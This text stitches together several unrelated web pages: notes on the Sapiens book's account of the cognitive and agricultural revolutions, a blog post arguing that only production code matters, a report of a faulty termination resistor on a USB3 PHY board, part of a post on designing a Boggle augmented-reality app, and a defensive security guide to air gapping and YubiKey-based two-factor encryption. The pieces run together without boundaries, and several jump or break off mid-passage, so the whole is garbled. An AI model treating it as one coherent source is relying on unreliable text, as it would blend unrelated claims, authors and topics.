<p>It doesn’t seem likely. A larger brain needs more energy and thus reduces the chance you’ll survive. Getting more energy meant hunting more.</p>

<p>One contributing factor was the domestication of fire. Fire paved the way for cooking.</p>

<p>Whereas chimpanzees spend 5 hours a day chewing raw food, a single hour suffices for people eating cooked food. The advent of cooking enabled humans to eat more kinds of food, to devote less time to eating, and to make do with smaller teeth and shorter intestines. Some scholars believe there is a direct link between the advent of cooking, the shortening of the human intestinal track, and the growth of the human brain. Since long intestines and large brains are both massive energy consumers, it’s hard to have both. By shortening the intestines and decreasing their energy consumption, cooking inadvertently opened the way to the jumbo brains.</p>

<p>And, we weren’t alone. Competing with us were the Neanderthals, among other species. They were stronger, they had bigger brains, and they could survive the cold. How come, then, did we “win”?</p>

<p>We aren’t sure. The most likely answer is the very thing that makes the debate possible: Homo sapiens conquered the world thanks above all to its unique language.</p>

<h2 id="cognitive-revolution">Cognitive Revolution</h2>

<p>The appearance of new ways of thinking and communicating, between 70,000 and 30,000 years ago, constitutes the Cognitive Revolution. What caused it? We’re not sure. The most commonly believed theory argues that accidental genetic mutations changed the inner wiring of the brains of Sapiens, enabling them to think in unprecedented ways and to communicate using a new type of language. We might call it the Tree of Knowledge mutation.</p>

<!-- 
> All new humans are improvements over the past?
> As in, the de facto keeps rising.

>These mutated humans were praised for their initiative and were more successful
>Till everyone became like this and then even more better humans were praised and the previous became the normal -->

<p>What’s special about our language?</p>

<p>Our language is amazingly supple. We can connect a limited number of sounds and signs to produce an infinite number of sentences, each with a distinct meaning. We can thereby ingest, store and communicate a prodigious amount of information about the surrounding world. A monkey can yell to its comrades, ‘Careful! A lion!’ But a modern human can tell her friends that this morning, near the bend in the river, she saw a lion tracking a herd of bison. She can then describe the exact location, including the different paths leading to the area. With this information, the members of her band can put their heads together and discuss whether they ought to approach the river in order to chase away the lion and hunt the bison.</p>

<!-- Most likely, both the gossip theory (who can be trusted and who can't) and the there-is-a-lion-near-the-river theory are valid.  -->

<p>Yet the truly unique feature of our language is not its ability to transmit information about men and lions. Rather, it’s the ability to transmit information about things that do not exist at all. As far as we know, only Sapiens can talk about entire kinds of entities that they have never seen, touched or smelled.</p>

<!-- The alpha male usually wins his position not because he is physically stronger, but because he leads a large and stable coalition -->

<p>Using language, lots of humans could work together, form a tribe, help each other, and hunt together.</p>

<p>However, communicating with lots of people brings with it new co-ordination problems. The critical threshold for a group interacting together is 150 people.</p>

<!-- But once the threshold of 150 individuals is crossed, things can no longer work that way. You cannot run a division with thousands of soldiers the same way you run a platoon. Successful family businesses usually face a crisis when they grow larger and hire more personnel. If they cannot reinvent themselves, they go bust.  -->

<p>How did Homo sapiens manage to cross this critical threshold, eventually founding cities comprising tens of thousands of inhabitants and empires ruling hundreds of millions? The secret was probably the appearance of fiction. Large numbers of strangers can cooperate successfully by believing in common myths. This is an imagined reality.</p>

<!-- Ever since the Cognitive Revolution, Sapiens has thus been living in a dual reality. On the one hand, the objective reality of rivers, trees and lions; and on the other hand, the imagined reality of gods, nations and corporations.  -->

<!-- As time went by, the imagined reality became ever more powerful, so that today the very survival of rivers, trees and lions depends on the grace of imagined entities such as gods, nations and corporations. -->

<p>Unlike lying, an imagined reality is something that everyone believes in, and as long as this communal belief persists, the imagined reality exerts force in the world.</p>

<p>In other words, while the behaviour patterns of archaic humans remained fixed for tens of thousands of years, Sapiens could transform their social structures, the nature of their interpersonal relations, their economic activities and a host of other behaviours within a decade or two.</p>

<!-- > Because of the cognitive Revolution and the introduction of imagined reality -->

<p>For example, consider trade. Trade cannot exist without trust, and it is very difficult to trust strangers. The global trade network of today is based on our trust in such fictional entities as the dollar, the Federal Reserve Bank, and the totemic trademarks of corporations. When two strangers in a tribal society want to trade, they will often establish trust by appealing to a common god, mythical ancestor or totem animal.</p>

<!-- One on one, even ten on ten, we are embarrassingly similar to chimpanzees. Significant differences begin to appear only when we cross the threshold of 150 individuals, and when we reach 1,000–2,000 individuals, the differences are astounding -->

<!-- The real difference between us and chimpanzees is the mythical glue that binds together large numbers of individuals, families and groups. This glue has made us the masters of creation. -->

<p>Our Tree of Knowledge mutation was significant. However, it’s not just our biology that brought us where we are today.</p>

<ol>
  <li>
    <p>Biology sets the basic parameters for the behaviour and capacities of Homo sapiens. The whole of history takes place within the bounds of this biological arena.</p>
  </li>
  <li>
    <p>This arena is extraordinarily large, allowing Sapiens to play an astounding variety of games. Thanks to their ability to invent fiction, Sapiens create more and more complex games, which each generation develops and elaborates even further</p>
  </li>
  <li>
    <p>Consequently, in order to understand how Sapiens behave, we must describe the historical evolution of their actions.</p>
  </li>
</ol>

<!-- Referring only to our biological constraints would be like a radio sports-caster who, attending the World Cup football championships, offers his listeners a detailed description of the playing field rather than an account of what the players are doing. -->

<!-- There is some evidence that the size of the average Sapiens brain has actually decreased since the age of foraging. Survival in that era required superb mental abilities from everyone. When agriculture and industry came along people could increasingly rely on the skills of others for survival, and new ‘niches for imbeciles’ were opened up. You could survive and pass your unremarkable genes to the next generation by working as a water carrier or an assembly-line worker. -->

<h2 id="agricultural-revolution">Agricultural Revolution</h2>

<p>The currency of evolution is neither hunger nor pain, but rather copies of DNA helixes. Just as the economic success of a company is measured only by the number of dollars in its bank account, not by the happiness of its employees, so the evolutionary success of a species is measured by the number of copies of its DNA. If no more DNA copies remain, the species is extinct, just as a company without money is bankrupt. If a species boasts many DNA copies, it is a success, and the species flourishes. From such a perspective, 1,000 copies are always better than a hundred copies. This is the essence of the Agricultural Revolution: the ability to keep more people alive under worse conditions.</p>

<p>Rather than heralding a new era of easy living, the Agricultural Revolution left farmers with lives generally more difficult and less satisfying than those of foragers. Hunter-gatherers spent their time in more stimulating and varied ways, and were less in danger of starvation and disease. The Agricultural Revolution certainly enlarged the sum total of food at the disposal of humankind, but the extra food did not translate into a better diet or more leisure. Rather, it translated into population explosions and pampered elites. The average farmer worked harder than the average forager, and got a worse diet in return. The Agricultural Revolution was history’s biggest fraud.</p>

<!-- > The average person in Jericho of 8500 BC lived a harder life than the average person in Jericho of 9500 BC or 13,000 BC. But nobody realised what was happening. Every generation continued to live like the previous generation, making only small improvements here and there in the way things were done. Paradoxically, a series of ‘improvements’, each of which was meant to make life easier, added up to a millstone around the necks of these farmers -->
<!-- 
--- Way of life being lost over generations
    Like with the foundation.
    Also short sightedness.
    As, working harder here meant more food => can better feed children => even more people exist => You're back where you started, except you're working harder.
 -->

<p>Compared to foraging, working a bit harder on the farm meant more food. Settling down on the farm also meant greater freedom to reproduce - you’re not travelling all the time, so you can afford to have more children. This in turn, meant a higher population. And a higher population meant higher food requirements. Thus, the farmers were forced to work even harder.</p>

<p>Why didn’t humans abandon farming when the plan backfired? Partly because it took generations for the small changes to accumulate and transform society and, by then, nobody remembered that they had ever lived differently. And partly because population growth burned humanity’s boats. If the adoption of ploughing increased a village’s population from a hundred to 110, which ten people would have volunteered to starve so that the others could go back to the good old times? There was no going back. The trap snapped shut.</p>

<blockquote>
  <p>One of history’s few iron laws is that luxuries tend to become necessities and spawn new obligations</p>
</blockquote>

<p>This discrepancy between evolutionary success and individual suffering is perhaps the most important lesson we can draw from the Agricultural Revolution. When we study the narrative of plants such as wheat and maize, maybe the purely evolutionary perspective makes sense. Yet in the case of animals such as cattle, sheep and Sapiens, each with a complex world of sensations and emotions, we have to consider how evolutionary success translates into individual experience.</p>

<!-- In the following chapters we will see time and again how a dramatic increase in the collective power and ostensible success of our species went hand in hand with much individual suffering. -->

<!-- How the agricultural revolution led to individual suffering -> -->

<!-- 6: Building Pyramids -->

<!-- This was a far-reaching revolution, whose impact was psychological as much as architectural. Henceforth, attachment to ‘my house’ and separation from the neighbours became the psychological hallmark of a much more self-centered creature. -->

          <a name="topofpage"></a>
          <p>Throughout my career, I’ve developed some <em>opinions</em>. Some have worn particularly deep ruts,
reinforced by years of experience. I tried to figure out what these
had in common, and it’s
the idea that <strong>code in production is the only code that matters</strong>. Staging doesn’t
matter, code on your laptop doesn’t matter, QA doesn’t matter,
only production matters. Everything else is debt.</p>

<p>This perspective probably comes from years sitting in between
operations and product development. I strongly
believe that teams should optimize for getting code to production as quickly as
possible as well as responding to incidents in production.</p>

<p>This idea, and a lot of the practices it implies, can be
counter-intuitive or controversial, so I want to dive into them a little
further. What follows is a set of practices and principles I believe are true,
considering my underlying belief that code working in production is the only
code that matters.</p>

<h2 id="engineers-should-operate-their-code">1. Engineers should operate their code.</h2>

<p><strong>Engineers are the subject matter experts for the code they write and should be
responsible for operating it in production</strong>. In this context, “operating” means
deploying, instrumenting, and monitoring code as well as helping to resolve
incidents related to or impacting that code. The responsibility of operating
code aligns incentives - it encourages engineers to write code that is
observable and easy to debug, and connects them to what customers really care
about. It encourages them to be curious about how their code is performing in
production. Importantly, engineers should be on-call for their code - being
on-call creates a positive feedback loop and makes it easier to know if their
efforts in writing production-ready code are paying off. I’ve heard people
complain about the prospect of being on-call, so I’ll just ask this: if you’re
not on-call for your code, who is?</p>

<p>If you’re not currently on-call for your code but want to be, and can help
influence this decision, there are some things you can do. Set up PagerDuty (or
similar) schedules for each group of engineers responsible for specific
services or parts of your code. A good schedule has 6–8 engineers. There are
plenty of variations, but a typical template is to have one-week rotations,
where you’ll be on-call for secondary for a week and then primary for a week.
Configuring alerts is a separate topic, which probably deserves it’s own blog
post entirely, but focus on things that impact your customers (see:
Symptom-based alerting) and remember that you’re ultimately responsible for how
you respond to alerts, which means you can change them.</p>

<p>There are two talks I’d recommend watching that touch on the topic of
configuring alerts: Liz Fong-Jones talks about SLOs in <a href="https://www.youtube.com/watch?v=MT4jbUzEVL0">Cultivating Production Excellence</a> and Aditya Mukerjee does a great job talking about techniques for
managing alerts in <a href="https://vimeo.com/274820572">Warning: This Talk Contains Content Known to the State of California to Reduce Alert Fatigue</a>.</p>

<h2 id="buy-almost-always-beatsbuild">2. Buy Almost Always Beats&nbsp;Build</h2>

<p><strong>If you can avoid building something, you should.</strong> Code is the most expensive
way to solve a problem that isn’t addressing a core area of your business. For
most small to mid-sized companies, there are open source or better yet, hosted
solutions that solve a wide range of common problems. I mean things like git
repository hosting (Github, Gitlab, Bitbucket, etc), observability tooling
(Honeycomb, Lightstep, etc), managed databases (Amazon RDS, Confluent Kafka,
etc), alerting (PagerDuty, OpsGenie, etc) and a whole host of other commodity
technologies. This even applies to your infrastructure - if you can help
it, don’t roll your own Kubernetes clusters (side note: do you even need to use
Kubernetes?), don’t roll your own load balancers if you can use Amazon ELB or
ALBs.</p>

<p>Unfortunately, <a href="https://en.wikipedia.org/wiki/Not_invented_here">NIH</a> syndrome is very real and some companies get burned badly by
this. I’ve seen teams light time and money on fire reinventing components when
better, more battle-tested alternatives exist in the market. Those same teams
almost always end up spending years contending with the resulting technical
debt. If you’re on such a team and have the will and ability to impact change,
start rolling back these decisions one by one. Migrate your databases to a
managed provider, migrate your feature flagging system to a SaaS tool (i.e.
LaunchDarkly). Keep going until the only software you maintain yourselves is
the software that delivers value to your customers. You’ll be much, much better
off for it.</p>

<h2 id="make-deployseasy">3. Make Deploys&nbsp;Easy</h2>

<p>Deploying should be a frequent and unexciting activity. <strong>Engineers should be
able to deploy with minimal manual steps and it should be easy to see if the
deploy is successful</strong> (this requires instrumenting your code for observability,
which - tada - is covered above), and it should be easy to roll back a deploy
if something doesn’t go well. Deploying frequently implies that
deploys are smaller, and smaller deploys are generally easier, faster and
safer.</p>

<p>Many teams implement periods where deploys are forbidden - these can be
referred to as code freezes, or deploy policies like “Don’t deploy on Fridays”.
Having such blackout periods can lead to a pile-up of changes, which increases
the overall risk of something going very wrong.</p>

<p>If you’re on a team that fears deploys, dedicate a percentage of your
engineering time to improvements in your deployment pipeline until the fear is
gone. On a recent team I worked with, we were able to improve deploy times from
3 hours to 30 minutes, which drastically improved the teams’ confidence in the
deploy process. A natural side effect of this was that engineers started
deploying much more frequently instead of waiting for changes to pile up enough
to warrant a “release” (which was synonymous with a deploy).</p>

<p>The book
<a href="https://www.amazon.com/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a>
has been getting a lot of attention. If you haven’t read it, I’d recommend it.
The team behind it also publishes the <a href="https://cloud.google.com/devops/">State of DevOps</a>
reports, which are full of well-researched information about what various
companies in the industry are doing. It’s not a coincidence that two of the
four key metrics that the book focuses on are directly related to this (Deploy
Frequency, Change Lead Time). Shipping is <a href="https://www.heavybit.com/library/podcasts/o11ycast/ep-12-speed-of-deployment-with-rich-archbold-of-intercom/">your company’s heartbeat</a>.</p>

<h2 id="trust-the-people-closest-to-theknives">4. Trust the People Closest to the&nbsp;Knives</h2>

<p><strong>The people who work with a system are the ones who understand it best.</strong> This
applies to any part of the socio-technical systems within which we all work. In
the case of software systems, the engineers who deploy every day and are
on-call for critical services understand the level of risk they operate in. A
sad trend is that managers tend to overestimate their teams’ progress on
certain transitions - i.e. cloud-native, DevOps, etc. The higher up the
management chain, the larger this overestimation tends to be. Engineers who
deploy and get paged when things break know where the bodies are buried and
they know what needs the most work. They should, therefore, be the primary
stakeholders responsible for prioritizing technical work.</p>

<p>Another manifestation of this principle applies to platform or services teams.
If you’re responsible for building some shared component that’s used within
your organization (i.e. a messaging system, ci/cd infrastructure, shared
libraries or services) there’s an uncomfortable truth lurking for you: the
people who use your work know more about it than you do in many cases. They
understand implicitly how it serves customers and they know what contortions or
hoops they have to jump through to get it to work. Listen to them for
clues on how to improve the UX of your services and tools.</p>

<h2 id="qa-gates-make-qualityworse">5. QA Gates Make Quality&nbsp;Worse</h2>

<p>Many teams have a manual QA step that gets performed before deploys. The idea,
I guess, is to have someone run automated or manual tests to verify that a set
of changes are ready to be released. This sounds like a comforting
idea - having a human being (or team of human beings) “verify” a release before
it goes out - <strong>but it falls victim to several false assumptions and creates
some misalignments that do more harm than good.</strong></p>

<p>First of all, if there’s manual work that needs to be done before a deploy can
go out, that creates a bottleneck - if you’re making deploys easy, and
deploying small changes frequently, no QA team is going to be able to keep up
testing every deploy, and will inevitably block teams from deploying. That’s no
good. If you have manual tests, automate them and build them into your CI
pipeline (if they do deliver value).</p>

<p>Secondly, the teams doing QA often lack context and are under time pressure.
They may end up testing “effects” instead of “intents”. For example, I’ve seen
QA teams burn time testing that when something happens in a UI, something
related happens in a database. What happens when an engineer refactors that UI
component and changes the underlying data model? The functionality works, but
the test breaks. Because two teams are involved, this takes coordination and
time to fix. Similarly, I’ve seen QA teams block deploys because of failing
tests when caching was introduced at the CDN layer - a TTL of 5 seconds on an
activity feed may not ever be noticed by a user but it might break QA tests
causing unnecessary conflicts between product and QA engineers.</p>

<p>Luckily, solving this one is easy. Instead of having a dedicated QA team work
on creating manual and automated test cases that run in a fictitious QA
environment, reassign that team to work on continuous testing in production.
Instead of being a gate for deploys, a QA team could continuously verify that
production is working as expected. QA teams are also well situated to lead
Chaos Engineering initiatives, where faults are intentionally injected in
production. QA engineers could also work on making the CI/CD pipeline more
reliable, so that deploys are no longer a nightmare.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    

    <p>I've written a bit about my look at “commercial off-the-shelf” USB3 PHY boards; and have been
taking a look recently at the <a href="https://www.mouser.com/ProductDetail/Design-Gateway/AB07-USB3FMC?qs=5aG0NVq1C4wWGaHs8Oqcww%3D%3D">Design Gateway AB07-USBFMC module</a>. It turns out that my unit has what seems to be a pretty
embarrassing defect.</p>
<p>I've been testing my in-progress USB3 gateware with this PHY; and I've been running into an
interesting issue: periodically, some of the raw values sent were off by a single bit.</p>
<p>When training a USB3 link, one of the data sequences exchanged looks like this:</p>
<div><pre><code data-lang="sh">BC BC BC BC <span>00</span> <span>00</span> 4A 4A 
4A 4A 4A 4A 4A 4A 4A 4A 
</code></pre></div><p>When using the AB07-USBFMC, trying to send this pattern resulted in the following:</p>
<div><pre><code data-lang="sh">BC BC BC BC <span>00</span> <span>00</span> 0A 4A
0A 4A 0A 4A 0A 4A 0A 4A
</code></pre></div><p>This is interesting for two reasons:</p>
<ul>
<li>This PHY has geared inputs, and accepts two bytes of data at a time.</li>
<li>The incorrect values (<code>0A</code>) are off from the correct value (<code>4A</code>) by a single bit.</li>
</ul>
<p>Sure enough, modifying the data packet to send <code>FF</code> instead of <code>4A</code> pretty clearly shows off that missing bit:</p>
<div><pre><code data-lang="sh">BC BC BC BC <span>00</span> <span>00</span> BF FF
BF FF BF FF BF FF BF FF
</code></pre></div><p>At this point, I assumed that I'd gotten the pinout incorrect; and that I'd been writing to the wrong pin –
but careful examination of the documentation and my FPGA I/O definitions suggested that I had things right.
This suggested it was time to check things on the physical layer.</p>
<p>The board in question looks like this:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/board.jpg" alt="The PHY board, which features a notable long span of resistors, neatly tucked in parallel."> <figcaption>
            <h4>The AB07-USBFMC (slightly modified as detailed later).</h4>
        </figcaption>
</figure>

<p>Notably, there's a long series of what look like termination / signal conditioning resistors present at
the PHY boundary – and it looks like there's about 32 in total; which would make sense: 16 for transmit,
and 16 for receive.</p>
<p>A quick probe verifies that these are ~50R resistors, which would make a lot of sense for series termination:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/50r.jpg" alt="Multimeter showing a measurement of 47.5 ohms."> <figcaption>
            <h4>Sure looks like a series termination resistor.</h4>
        </figcaption>
</figure>

<p>This is excellent news, as it means that the signals are easily accessible without “voiding our warranty”,
which is a bit of a comfort when dealing with a rather expensive evaluation board.</p>
<p>So, as a next-step test, I had my FPGA squirt a 100MHz clock signal into every line on the transmit bus,
and probed the PHY side of one of those termination resistors:</p>

            <h4>A nice, healthy wobble. AC coupled.</h4>
        </figcaption>
</figure>

<p>The frequency and amplitude of this signal are pretty in-line with what you'd expect: the amplitude corresponds
nicely to a decently healthy logic <code>1</code>. But how does the signal look on the problematic bit?</p>
<p>I adjusted the FPGA design so it only squirted a wave into the problematic bit; and probed in line until I found it:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/phy_tx_unhealthy.png" alt="A somewhat-rounded square wave, consistent with probing a 100MHz clock."> <figcaption>
            <h4>A *lot* less happy. Still AC couled for display.</h4>
        </figcaption>
</figure>

<p>Ut-oh. This signal's looking a lot less happy – and a lot more attenuated. At approximately 500mV peak,
you'd be hard pressed to consider this a logic <code>1</code>, even if you gave it your very best squint. There's no way
this thing would have worked in a test environment – which makes it seem very unlikely that this board was, y'know,
tested.</p>
<p>This immediately made me suspicious of the termination resistor sitting next to it; and apparently for good reason:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/larger_50r.jpg" alt="Multimeter showing a measurement of 396.0 ohms."> <figcaption>
            <h4>Quite possibly the largest 50 Ω I've ever seen.</h4>
        </figcaption>
</figure>

<p>This resistor is quite clearly supposed to be 50 Ω. It's also quite clearly <em>not</em> 50 Ω, despite sitting cleanly
in the middle of a row of 50 Ω resistors, and pretty much definitely the source of my problems.</p>
<p>So, naturally it's time to perform what I assume must be several hundred dollars worth of rework on this $1.65k board.
Luckily, I stock E24 0402s, so I had the resistor replaced with an appropriate value in no time.</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/happier.png" alt="Oscilloscope display of a corrected waveform."> <figcaption>
            <h4>Much happier. Note the amplitude.</h4>
        </figcaption>
</figure>

<p>With an appropriate value replaced, everything looks much happier – and everything works much more nicely.
Finally, our USB training sets look just the way they should:</p>
<figure>
    <img src="https://lab.ktemkin.com/post-media/ab07-usb3fmc-wtf/yay.png" alt="Analyzer display showing the correct value of our training set."> <figcaption>
            <h4>A correct Training Set, at last.</h4>
        </figcaption>
</figure>

<p>I'm planning on reaching out to Design Gateway – to at least let them know that this is an issue on some boards.
I'll update this post if/when I get a reply.</p>

                <div><p>During the summer of 2019, I received a Facebook message from Roboflow co-founder <a href="https://twitter.com/braddwyer">Brad Dwyer</a> asking me if I wanted to design a new mobile app he was working on. His previous app, <a href="https://magicsudoku.com/">Magic Sudoku</a>, had recently generated some buzz online and even won a <a href="https://blog.producthunt.com/golden-kitty-awards-winners-7c2628e5f429">Golden Kitty award from Product Hunt</a>, so he was excited to build another app using Apple's ARKit.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/FH30v5kCWAw?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>Video version of this post: don't forget to <a href="https://bit.ly/rf-yt-sub">subscribe</a>!</figcaption></figure><p>At the beginning of our meeting, Brad placed a Boggle box in front of me and said he wanted to experiment with augmented reality in the board game space. His vision was to blend the the experience of playing board games on your phone with the experience of playing a physical board game with friends. </p><h3 id="research">Research</h3><figure><img src="https://blog.roboflow.com/content/images/2020/10/discovery01.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/discovery01.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/discovery01.jpg 1000w, https://blog.roboflow.com/content/images/size/w1600/2020/10/discovery01.jpg 1600w, https://blog.roboflow.com/content/images/size/w2400/2020/10/discovery01.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>There are so many ways to play Boggle.</figcaption></figure><figure><img src="https://blog.roboflow.com/content/images/2020/10/discovery02.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/discovery02.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/discovery02.jpg 1000w, https://blog.roboflow.com/content/images/2020/10/discovery02.jpg 1329w" sizes="(min-width: 720px) 720px"></figure><p>My first step was to buy Boggle and start playing it regularly. I also began researching different ways you can play Boggle, including all the variations sold by Hasbro, both physical and digital. I even watched old clips of a <a href="https://www.youtube.com/watch?v=EbxlB67nnmM">short-lived Boggle game show</a> from the '90s on Youtube.</p><h3 id="first-design-iteration-where-s-the-augmented-reality">First Design Iteration - Where's the Augmented Reality?</h3><p>I have designed many mobile apps over the years, but this was my first foray into augmented reality. From our initial research and our time spent playing the game, Brad and I identified some pretty obvious pain points.</p><ol><li>There’s no way quick way to identify words you’ve missed unless you type all the letters into an <a href="http://fuzzylogicinc.net/boggle/">online Boggle solver</a>.</li><li>It takes a significant amount of time to read your words out loud and score them.</li><li>It can be a pain to challenge words from other players if you aren’t familiar with the Boggle dictionary.</li></ol><p>The main requirement was to use <a href="https://blog.roboflow.com/creating-boardboss-a-mobile-application-that-improves-boggle/">computer vision to scan the letters</a> in the grid and provide a list of all possible words. I was still learning the capabilities of ARKit so, initially, I didn’t spend a lot of time designing the AR experience. I played it safe and designed a simple Boggle app that listed all the possible words, provided a 3-minute timer, and gave users the ability to enter their scores after each round. </p><figure><img src="https://blog.roboflow.com/content/images/2020/10/i1-screens.jpg" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/10/i1-screens.jpg 600w, https://blog.roboflow.com/content/images/size/w1000/2020/10/i1-screens.jpg 1000w, https://blog.roboflow.com/content/images/2020/10/i1-screens.jpg 1200w" sizes="(min-width: 720px) 720px"><figcaption>My first iteration was too light on augmented reality.</figcaption></figure><p>At this point, my designs were fulfilling Brad’s main requirement of including a computer vision component, but the app wasn’t really differentiating itself from other scorekeeping apps.

Well, I rely more on a developer to explore what’s possible and we end making decisions as we go. For instance, can we customize the built-in picker or should we build our own?</p><p>Animations were a great example of this. The app needed to do more than just show the user where the word was on the grid. We wanted to animate it for them. Brad provided various animation options and I was able to pick which ones would work best.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Security is an illusion, especially with computers. The systems are so complex, handled by so many different people that nobody really has a good idea of how everything works. Even the best specialists have knowledge gaps: software, hardware, etc… This creates a security nightmare: breaking stuff is trivial, fixing the systems is nearly impossible.</p>
<h2 id="high-security-systems-still-exist">High Security Systems Still Exist</h2>
<p>There are systems that are protected against nearly all attacks. <strong>Their main philosophy is not to fix the security issues but to prevent an attacker from accessing the system in the first place.</strong> You can’t hack something that’s not there. However these systems are painful to use, especially for their lack of internet connection. Here are the main techniques used in a high security system:</p>
<ul>
<li>
<p><strong>Air Gapping</strong>: The device can’t connect to anything that is not physically plugged into it. No internet, wifi, bluetooth, speaker, microphone, webcam. Anything that can communicate with the outside world is physically removed from the electronic device.</p>
</li>
<li>
<p><strong>Non Contamination Protocol</strong>: Air Gapping is not sufficient (<a href="https://en.wikipedia.org/wiki/Stuxnet">stuxnet</a> is a good example of why it isn’t). Everything plugged into the air gapped device (like usb keys) can’t be plugged anywhere else. No exceptions. This prevents any information from getting out. I would even recommend not to plug anything that comes from another device (stuff like stuxnet or ransomware can still make some damage).</p>
</li>
<li>
<p><strong>Physical Protection</strong>: Non-contaminated air gapped devices are impossible to attack remotely. The only way is to access them physically. Having the electronic device hidden in a place that is difficult to access (e.g. in a safe) will protect it better.</p>
</li>
<li>
<p><strong>Full Disk Encryption</strong>: Physical Protection is not foolproof. An attacker can still get access to it with enough resources. To protect the information inside your device, encrypt its entire content. Not all types of encryption are made equal, we will talk about it later in this article.</p>
</li>
<li>
<p><strong>Tamper Evident System</strong>: The last remaining attack on an electronic device, after you’ve already used all of the above techniques, is to tamper it. The main goal is to access the encryption key when it is entered. Using tamper evident techniques (hardware and software) will alert you that somebody has modified your device to access your password (more about it in Two Layers of Encryption below).</p>
</li>
<li>
<p><strong>Backup</strong>: The last remaining problem is system failure. As long as your backups follow all of the above techniques, you can have as many as you want. Store them in a different location for increased safety.</p>
</li>
</ul>
<p><strong>Security is more about how you use the hardware/software rather than having a secure device in itself. It’s more about protocol than technology.</strong></p>
<p>I have seen classified environment with less security than the one just presented. Using a device with all of the above techniques will guarantee an electronic fortress. However this creates a big problem: <strong>you become the information’s weak link</strong>. It means that an attacker will no longer try to hack or decrypt your device, but instead will threaten you in order to access the information inside it.</p>
<h2 id="plausible-deniability">Plausible Deniability</h2>
<p><img src="https://www.alvarez.io/img/color/2FE.png" alt="Rubber-hose cryptanalysis">
<em><a href="https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis">Rubber-hose cryptanalysis</a> from <a href="https://xkcd.com/538/">xkcd</a></em></p>
<p>To prevent being compelled to reveal your passwords, somebody invented <a href="https://en.wikipedia.org/wiki/Deniable_encryption">Deniable Encryption</a>. Basically you have two passwords: when you enter the first one the information decrypted is different than when you enter the second one. You use your device with the second password to work on the sensitive information (which can’t be accessed using the first password). In case somebody threatens you, you give them the first password. They will decrypt your device and see that there is no information (or if there is, info that is not sensitive).</p>
<p>In practice Plausible Deniability is problematic:</p>
<ul>
<li>
<p>Tools and techniques exist to detect the presence of a secondary password (Deniable Encryption).</p>
</li>
<li>
<p>If your attacker sees that the system can use plausible deniability, they may not believe that there is only one password and therefore may continue to threaten you until you reveal the second one.</p>
</li>
<li>
<p>It will be harder for you to pass lie detection tests since you are still able to access the sensitive information using a secondary password.</p>

<p>What you really want, if threatened, is not to be physically able to unlock your device. If you can’t decrypt the information, nobody has a reason to threaten you.</p>
<h2 id="two-factor-encryption">Two Factor Encryption</h2>
<p>Two Factor Encryption uses your password in addition to something you possess to generate the encryption key of your device. In general these secondary factors look like USB keys. To decrypt the information, you need your password (50% of the key) and some information you don’t know, stored/calculated by your secondary factor (the other 50% of the key).</p>
<p>You can’t open your device without these two elements: your password and the secondary factor.</p>
<p>The beautiful thing is that if you break the secondary factor, you won’t be able to access your device and its backups. You can’t be compelled to decrypt the information, because you simply can’t: your password, which you can now freely communicate to your attacker, will not be enough.</p>
<p><strong>Using Two Factor Encryption creates a physical “red button” which, if pressed, will destroy all access to the information in your devices (even offline backups stored in different locations).</strong></p>
<p>This also has the side effect of preventing you from accessing your device’s information ever again. This is one disadvantage of Two Factor Encryption over Plausible Deniability, which is that you can’t access your data after the attacker is done with you. However if you’re handling sensitive information, it is very likely that you’d rather have it destroyed than letting it fall into the wrong hands.</p>
<h2 id="yubikey">YubiKey</h2>
<p><img src="https://www.alvarez.io/img/color/2FE-2.png" alt="YubiKey"></p>
<p>A nice, affordable second factor for your encryption is a <a href="https://www.yubico.com/">YubiKey</a>. However there is no straightforward manual on how to use it, and the key has quite complex modes and functionalities.</p>
<p>If you are not a technical person, I will recommend using the <a href="https://support.yubico.com/hc/en-us/articles/360016614980-Understanding-Core-Static-Password-Features">password mode</a>. It is not as safe as the challenge mode, but it will be simpler to use and to configure.</p>
<p><strong>Password Mode</strong></p>
<p>The YubiKey can act as a usb keyboard. When the button is pressed, it will send a combination of keys (a kind of password) as if someone was typing. This makes it compatible with everything that requires a typed password. However using this mode implies that the 50% of the key coming from your 2FE will be the same across all devices. If it is intercepted it will drastically reduce the security.</p>
<p>To use the password mode, when prompted to your login information, enter your password (the thing you know), then plug your YubiKey and press the button. It will “type” the rest of the “password” (the thing you possess but don’t know). You can then access your device.</p>
<p>In this scenario the thing you know is 50% of the password, the other 50% of it (which you don’t know) is stored on your YubiKey and typed for you when you press the button.</p>
<p><strong>Challenge Mode</strong></p>
<p>The challenge mode is safer than the password mode, however it is more complex to configure and use. The information received from the YubiKey (the 50% of the key that comes from the 2FE) is different for each device. If it is intercepted, it will not compromise the security of other devices.</p>
<p>To use the challenge mode, your encryption software has to be compatible with it (contrary to the password mode which works with everything). When prompted to your login information, enter your password, and then the software will send a challenge (a phrase or an id you pre-configured) to the YubiKey which will respond with the missing 50% of the encryption key. The combination of the two elements (your password and the 2FE response), creating the encryption key, will unlock your device.</p>
<p>The advantage of the challenge mode is that if you configure a different challenge (phrase or id) for each device you will have a different response each time, making your encryption key unique on all your devices and backups. This increases the security a lot in case one of them is compromised.</p>
<h2 id="not-all-encryptions-are-made-equal">Not All Encryptions Are Made Equal</h2>
<p>Cryptography may be the hardest thing in security. If you screw it up, nobody will come and tell you about it, and  you will pay the consequences later on.</p>
<p><strong>Serpent Encryption Algorithm</strong></p>
